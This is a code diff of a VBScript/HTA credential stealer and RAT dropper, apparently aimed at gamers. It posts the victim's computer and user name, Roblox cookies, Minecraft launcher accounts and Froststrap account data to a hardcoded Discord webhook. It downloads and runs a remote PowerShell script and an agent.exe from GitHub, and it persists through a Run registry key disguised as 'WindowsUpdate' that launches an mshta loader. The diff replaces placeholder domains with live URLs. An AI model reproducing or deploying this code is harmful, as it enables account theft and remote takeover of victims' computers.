@@ -9,13 +9,12 @@ Dim sh, fso, WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' --- WEBHOOK (PUT YOURS HERE) ---
+' --- WEBHOOK ---
 WH = "https://discord.com/api/webhooks/1562254751888842823/3bZLLkNvHLfxcy6UZZ-Tm5wdAgHt7xw8GL70VNzJ8RSmZAZq_-QRSVSAyiMJ1pDrLJyB"
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- Initial Grab ---
 Call GrabTokens
 Call IP
 Call GrabRoblox
@@ -23,7 +22,6 @@ Call GrabMinecraft
 Call GrabFroststrap
 Call Persistence
 
-' --- Download & Execute RAT 2 Times ---
 Dim downloadAttempt
 For downloadAttempt = 1 To 2
     Call PostEmbed(":arrows_counterclockwise: Download Attempt " & downloadAttempt & "/2", "PC: " & PC & " | User: " & USER, 3447003)
@@ -31,7 +29,6 @@ For downloadAttempt = 1 To 2
     If downloadAttempt < 2 Then Call SleepMinutes(2)
 Next
 
-' --- Re-run grab chain 4x (every 5 min) ---
 Dim runCount
 For runCount = 1 To 4
     Call PostEmbed(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003)
@@ -45,7 +42,6 @@ Next
 
 window.close()
 
-' --- IP Function ---
 Sub IP()
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -63,7 +59,6 @@ Sub IP()
     Set xh = Nothing
 End Sub
 
-' --- GrabRoblox Function ---
 Sub GrabRoblox()
     Dim paths(4)
     paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
@@ -124,7 +119,6 @@ Sub GrabRoblox()
     PostEmbed "Roblox Cookie", "PC: " & PC & " | User: " & USER & vbCrLf & "**Cookie:**" & vbCrLf & "```" & cookie & "```", 65280
 End Sub
 
-' --- GrabMinecraft Function ---
 Sub GrabMinecraft()
     Dim launcherPath : launcherPath = sh.ExpandEnvironmentStrings("%APPDATA%") & "\.minecraft\launcher_accounts.json"
     Dim found : found = False
@@ -146,7 +140,6 @@ Sub GrabMinecraft()
     End If
 End Sub
 
-' --- GrabFroststrap Function ---
 Sub GrabFroststrap()
     Dim fp : fp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Froststrap\Cache\AccountManager.json"
     If Not fso.FileExists(fp) Then
@@ -163,10 +156,9 @@ Sub GrabFroststrap()
     sh.Run "powershell -NoP -Exec Bypass -Command """ & ps & """", 0, True
 End Sub
 
-' --- DropRAT ---
 Sub DropRAT()
-    ' POINT THIS TO YOUR AGENT.EXE
-    Dim dl : dl = "https://yourdomain.com/agent.exe"
+    ' REPLACE THIS WITH YOUR GITHUB RELEASE LINK
+    Dim dl : dl = "https://github.com/lozix94-afk/lozixloggedurmom/releases/download/v1/agent.exe"
     Dim op : op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.exe"
     If fso.FileExists(op) Then fso.DeleteFile op
 
@@ -190,10 +182,8 @@ Sub DropRAT()
     End If
 End Sub
 
-' --- Persistence ---
 Sub Persistence()
-    ' POINT THIS TO YOUR DOMAIN
-    Dim payload : payload = "mshta https://yourdomain.com/loader.hta"
+    Dim payload : payload = "mshta https://lozix94-afk.github.io/lozixloggedurmom/loader.hta"
     On Error Resume Next
 
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
@@ -207,12 +197,11 @@ Sub Persistence()
     Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 65280)
 End Sub
 
-' --- GrabTokens ---
 Sub GrabTokens()
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    ' POINT THIS TO YOUR STEAL.PS1
-    xh.Open "GET", "https://yourdomain.com/steal.ps1", False
+    ' REPLACE THIS WITH YOUR RAW GITHUB LINK
+    xh.Open "GET", "https://raw.githubusercontent.com/lozix94-afk/lozixloggedurmom/main/steal.ps1", False
     xh.Send
     If xh.Status <> 200 Then Exit Sub
     Dim pc: pc = xh.responseText
@@ -250,12 +239,10 @@ Sub GrabTokens()
     End If
 End Sub
 
-' --- Utility Functions ---
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
 Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
 Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
 
-' --- PostEmbed (direct to discord) ---
 Sub PostEmbed(t, d, c)
     Dim DQ: DQ = Chr(34)
     Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
@@ -267,7 +254,6 @@ Sub PostEmbed(t, d, c)
     Set h = Nothing
 End Sub
 
-' --- PostFile (direct to discord) ---
 Sub PostFile(fn, ct)
     Dim DQ: DQ = Chr(34)
     Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
@@ -280,7 +266,6 @@ Sub PostFile(fn, ct)
     Set h = Nothing
 End Sub
 
-' --- RunCmd ---
 Sub RunCmd(cmd)
     Dim w,p,i,s
     Set w = GetObject("winmgmts:\\.\root\cimv2")
@@ -304,7 +289,6 @@ Sub RunCmd(cmd)
     Loop
 End Sub
 
-' --- DecryptDPAPI ---
 Function DecryptDPAPI(b64)
     DecryptDPAPI = ""
     Dim inf: inf = TmpFile("dpi.txt")
@@ -321,7 +305,6 @@ Function DecryptDPAPI(b64)
     fso.DeleteFile outf, True
 End Function
 
-' --- Ej ---
 Function Ej(s)
     Ej = s
     Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
